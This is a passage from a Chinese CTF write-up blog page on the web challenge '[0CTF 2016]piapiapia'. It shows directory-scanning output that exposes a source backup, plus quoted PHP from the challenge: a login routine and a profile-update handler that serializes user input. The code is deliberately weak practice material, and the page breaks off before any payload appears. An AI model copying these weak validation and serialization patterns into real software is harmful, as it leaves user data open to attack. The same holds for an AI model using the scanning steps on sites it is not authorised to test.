@@ -1,0 +1,391 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>[0CTF 2016]piapiapia | Lengkur</title><meta name="author" content="Lengkur"><meta name="copyright" content="Lengkur"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="刚进来就一个登录框，尝试sql注入登录无果，用dirsearch扫目录，扫到其他路由 1234567[16:33:33] 200 -     0B - &#x2F;config.php[16:33:46] 200 -     2B - &#x2F;health[16:33:56] 200 -    11B - &#x2F;profile.php[16:33:56] 200 -   797B - &#x2F;register.php[16">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[0CTF 2016]piapiapia">
+<meta property="og:url" content="https://lengkur.github.io/2026/06/01/wp/BUUCTF/[0CTF%202016]piapiapia/index.html">
+<meta property="og:site_name" content="Lengkur">
+<meta property="og:description" content="刚进来就一个登录框，尝试sql注入登录无果，用dirsearch扫目录，扫到其他路由 1234567[16:33:33] 200 -     0B - &#x2F;config.php[16:33:46] 200 -     2B - &#x2F;health[16:33:56] 200 -    11B - &#x2F;profile.php[16:33:56] 200 -   797B - &#x2F;register.php[16">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lengkur.github.io/img/black.jpg">
+<meta property="article:published_time" content="2026-06-01T12:06:37.000Z">
+<meta property="article:modified_time" content="2026-06-09T05:03:37.214Z">
+<meta property="article:author" content="Lengkur">
+<meta property="article:tag" content="MD5">
+<meta property="article:tag" content="绕过">
+<meta property="article:tag" content="SQLi">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="jQuery">
+<meta property="article:tag" content="反序列化">
+<meta property="article:tag" content="session">
+<meta property="article:tag" content="BUUCTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lengkur.github.io/img/black.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "[0CTF 2016]piapiapia",
+  "url": "https://lengkur.github.io/2026/06/01/wp/BUUCTF/[0CTF%202016]piapiapia/",
+  "image": "https://lengkur.github.io/img/black.jpg",
+  "datePublished": "2026-06-01T12:06:37.000Z",
+  "dateModified": "2026-06-09T05:03:37.214Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lengkur",
+      "url": "https://lengkur.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/lengkur.png"><link rel="canonical" href="https://lengkur.github.io/2026/06/01/wp/BUUCTF/[0CTF%202016]piapiapia/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.4-b1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '[0CTF 2016]piapiapia',
+  isHighlightShrink: false,
+  isToc: false,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.8.0/styles/atom-one-dark.min.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><style>#loading-box {
+  position: fixed;
+  inset: 0;
+  z-index: 10000;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  padding: 24px;
+  background:
+    radial-gradient(circle at top, rgba(0,255,174,.08), transparent 32%),
+    linear-gradient(180deg, #02050a 0%, #05070d 100%);
+  transition: opacity .45s ease, visibility .45s ease;
+  overflow: hidden;
+}
+#loading-box::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background:
+    linear-gradient(rgba(255,255,255,.025) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(0,255,174,.035) 1px, transparent 1px);
+  background-size: 100% 4px, 24px 24px;
+  opacity: .35;
+  pointer-events: none;
+}
+.boot-shell {
+  position: relative;
+  width: min(760px, 92vw);
+  border: 1px solid rgba(0,255,174,.22);
+  border-radius: 18px;
+  background: rgba(5, 10, 18, .92);
+  box-shadow: 0 0 0 1px rgba(0,255,174,.08), 0 22px 80px rgba(0,0,0,.55), 0 0 32px rgba(0,255,174,.08);
+  backdrop-filter: blur(14px);
+  overflow: hidden;
+  color: #d9fef1;
+  font-family: "JetBrains Mono", "Fira Code", monospace;
+}
+.boot-shell::after {
+  content: '';
+  position: absolute;
+  inset: 0;
+  background: linear-gradient(180deg, rgba(255,255,255,.02), transparent 30%, transparent 70%, rgba(0,255,174,.03));
+  pointer-events: none;
+}
+.boot-topbar {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 14px 18px;
+  border-bottom: 1px solid rgba(0,255,174,.12);
+  background: rgba(6, 12, 22, .96);
+  color: #8ef7d1;
+  font-size: 13px;
+  letter-spacing: .08em;
+  text-transform: uppercase;
+}
+.boot-dots {
+  display: flex;
+  gap: 8px;
+}
+.boot-dots span {
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  background: rgba(0,255,174,.22);
+  box-shadow: 0 0 10px rgba(0,255,174,.18);
+}
+.boot-main {
+  padding: 28px 26px 24px;
+}
+.boot-logo {
+  margin-bottom: 18px;
+  color: #eafff8;
+  font-size: clamp(24px, 4vw, 38px);
+  font-weight: 700;
+  letter-spacing: .08em;
+  text-shadow: 0 0 14px rgba(0,255,174,.15);
+}
+.boot-logo .prompt {
+  color: #00ffae;
+  margin-right: 10px;
+}
+.boot-lines {
+  display: grid;
+  gap: 10px;
+  margin-bottom: 22px;
+  font-size: 14px;
+  line-height: 1.75;
+  color: #9fc8b8;
+}
+.boot-line {
+  opacity: 0;
+  transform: translateY(6px);
+  animation: bootLine .45s ease forwards;
+}
+.boot-line:nth-child(1){animation-delay:.1s}
+.boot-line:nth-child(2){animation-delay:.35s}
+.boot-line:nth-child(3){animation-delay:.6s}
+.boot-line:nth-child(4){animation-delay:.85s}
+.boot-line:nth-child(5){animation-delay:1.1s}
+.boot-line .ok {
+  color: #00ffae;
+}
+.boot-progress-wrap {
+  margin-top: 18px;
+}
+.boot-progress-label {
+  display: flex;
+  justify-content: space-between;
+  margin-bottom: 8px;
+  color: #78f3ca;
+  font-size: 13px;
+}
+.boot-progress {
+  position: relative;
+  height: 10px;
+  border-radius: 999px;
+  border: 1px solid rgba(0,255,174,.18);
+  background: rgba(255,255,255,.03);
+  overflow: hidden;
+}
+.boot-progress::before {
+  content: '';
+  position: absolute;
+  inset: 0;
+  width: 0%;
+  background: linear-gradient(90deg, #00ffae, #51d9ff);
+  box-shadow: 0 0 16px rgba(0,255,174,.22);
+  animation: bootProgress 1.65s cubic-bezier(.4,0,.2,1) forwards;
+}
+.boot-progress::after {
+  content: '';
+  position: absolute;
+  top: 0;
+  bottom: 0;
+  width: 80px;
+  background: linear-gradient(90deg, transparent, rgba(255,255,255,.3), transparent);
+  transform: translateX(-120px);
+  animation: bootShine 1.2s linear infinite;
+  animation-delay: .8s;
+}
+.boot-footer {
+  margin-top: 16px;
+  color: rgba(159, 200, 184, .8);
+  font-size: 12px;
+  letter-spacing: .04em;
+}
+@keyframes bootLine {
+  to { opacity: 1; transform: translateY(0); }
+}
+@keyframes bootProgress {
+  from { width: 0%; }
+  to { width: 100%; }
+}
+@keyframes bootShine {
+  to { transform: translateX(760px); }
+}
+@media (max-width: 640px) {
+  .boot-main { padding: 22px 18px 18px; }
+  .boot-topbar { padding: 12px 14px; }
+  .boot-lines { font-size: 12px; }
+}</style><div class="boot-shell"><div class="boot-topbar"><div class="boot-title">LENGKUR // boot sequence</div><div class="boot-dots"><span></span><span></span><span></span></div></div><div class="boot-main"><div class="boot-logo"><span class="prompt">></span><span>Lengkur</span></div><div class="boot-lines"><div class="boot-line">[*] loading workspace: `/notes` `/wp` `/tags`</div><div class="boot-line">[*] mounting modules: `php` `flask` `mysql` `redis`</div><div class="boot-line">[*] parsing writeups and exploit notes</div><div class="boot-line">[<span class="ok">OK</span>] security knowledge base online</div><div class="boot-line">[<span class="ok">OK</span>] access granted :: welcome back</div></div><div class="boot-progress-wrap"><div class="boot-progress-label"><span>initializing terminal ui</span><span>100%</span></div><div class="boot-progress"></div></div><div class="boot-footer">root@lengkur:~$ enter blog</div></div></div><script>(function(){
+  const loadingBox = document.getElementById('loading-box');
+  if (!loadingBox) return;
+  const removeLoading = () => {
+    loadingBox.style.opacity = '0';
+    loadingBox.style.visibility = 'hidden';
+    setTimeout(() => {
+      loadingBox.style.display = 'none';
+    }, 450);
+  };
+  window.addEventListener('load', () => setTimeout(removeLoading, 900));
+  document.addEventListener('pjax:complete', removeLoading);
+  setTimeout(removeLoading, 4200);
+})()</script></div><div class="bg-animation" id="web_bg" style="background-color: #05070d;"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/lengkur.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">141</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">55</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/notes/"><i class="fa-fw fas fa-book-open"></i><span> 笔记总览</span></a></li><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 全部笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签索引</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/writeups/"><i class="fa-fw fas fa-sitemap"></i><span> WP总览</span></a></li><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/SHCTF/"><i class="fa-fw fas fa-terminal"></i><span> SHCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF WEB</span></a></li><li><a class="site-page child" href="/categories/wp/%E6%98%9F%E8%8A%92%E6%9D%AF2026/"><i class="fa-fw fas fa-star"></i><span> 星芒杯2026</span></a></li><li><a class="site-page child" href="/categories/wp/UniCTF/"><i class="fa-fw fas fa-university"></i><span> UniCTF</span></a></li><li><a class="site-page child" href="/categories/wp/XMCTF/"><i class="fa-fw fas fa-bolt"></i><span> XMCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NCTF/"><i class="fa-fw fas fa-user-secret"></i><span> NCTF</span></a></li><li><a class="site-page child" href="/writeups/#all-platforms"><i class="fa-fw fas fa-ellipsis-h"></i><span> 更多分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/black.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Lengkur</span></a><a class="nav-page-title" href="/"><span class="site-name">[0CTF 2016]piapiapia</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> WEB学习经历</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/notes/"><i class="fa-fw fas fa-book-open"></i><span> 笔记总览</span></a></li><li><a class="site-page child" href="/categories/notes/"><i class="fa-fw fas fa-book"></i><span> 全部笔记</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签索引</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-pencil-alt"></i><span> Write Up</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/writeups/"><i class="fa-fw fas fa-sitemap"></i><span> WP总览</span></a></li><li><a class="site-page child" href="/categories/wp/"><i class="fa-fw fas fa-list-ul"></i><span> 全部文章</span></a></li><li><a class="site-page child" href="/categories/wp/ctfshow/"><i class="fa-fw fas fa-flag"></i><span> ctfshow</span></a></li><li><a class="site-page child" href="/categories/wp/SHCTF/"><i class="fa-fw fas fa-terminal"></i><span> SHCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NSSCTF-WEB/"><i class="fa-fw fas fa-skull"></i><span> NSSCTF WEB</span></a></li><li><a class="site-page child" href="/categories/wp/%E6%98%9F%E8%8A%92%E6%9D%AF2026/"><i class="fa-fw fas fa-star"></i><span> 星芒杯2026</span></a></li><li><a class="site-page child" href="/categories/wp/UniCTF/"><i class="fa-fw fas fa-university"></i><span> UniCTF</span></a></li><li><a class="site-page child" href="/categories/wp/XMCTF/"><i class="fa-fw fas fa-bolt"></i><span> XMCTF</span></a></li><li><a class="site-page child" href="/categories/wp/NCTF/"><i class="fa-fw fas fa-user-secret"></i><span> NCTF</span></a></li><li><a class="site-page child" href="/writeups/#all-platforms"><i class="fa-fw fas fa-ellipsis-h"></i><span> 更多分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-tree"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-id-badge"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">[0CTF 2016]piapiapia</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-06-01T12:06:37.000Z" title="发表于 2026-06-01 20:06:37">2026-06-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-06-09T05:03:37.214Z" title="更新于 2026-06-09 13:03:37">2026-06-09</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/">wp</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/wp/BUUCTF/">BUUCTF</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>刚进来就一个登录框，尝试sql注入登录无果，用dirsearch扫目录，扫到其他路由</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">[16:33:33] 200 -     0B - /config.php<br>[16:33:46] 200 -     2B - /health<br>[16:33:56] 200 -    11B - /profile.php<br>[16:33:56] 200 -   797B - /register.php<br>[16:33:57] 200 -    46B - /robots.txt<br>[16:34:01] 200 -    11B - /update.php<br>[16:34:04] 200 -  392KB - /www.zip<br></code></pre></td></tr></table></figure>
+
+<p>有一个<a target="_blank" rel="noopener" href="http://www.zip访问将其下载下来审计,在index.php中可以看到有username和password的长度限制/">www.zip访问将其下载下来审计，在index.php中可以看到有username和password的长度限制</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$username</span>) &gt; <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid user name&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &lt; <span class="hljs-number">3</span> <span class="hljs-keyword">or</span> <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$password</span>) &gt; <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid password&#x27;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">login</span>(<span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>)) &#123;<br>    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] = <span class="hljs-variable">$username</span>;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: profile.php&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>;<br><br></code></pre></td></tr></table></figure>
+
+<p>有调用login函数，这个函数的实现在class.php中，$user是一个user类的实例，根据这个长度限制和这个sql查找方式，sql注入在登录框是做不了什么了，还有一个register.php页面，我们正常注册账户，然后登录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br>    <span class="hljs-variable">$password</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$password</span>);<br><br>    <span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$object</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">select</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-variable">$where</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$object</span> &amp;&amp; <span class="hljs-variable">$object</span>-&gt;password === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>登录进去后可以看到只有一个更新用户信息的功能，对应源码是update.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br>    <span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>])) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br>    &#125;<br><br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>    <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>    <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br>    <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>    <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>    <span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><br></code></pre></td></tr></table></figure>
+
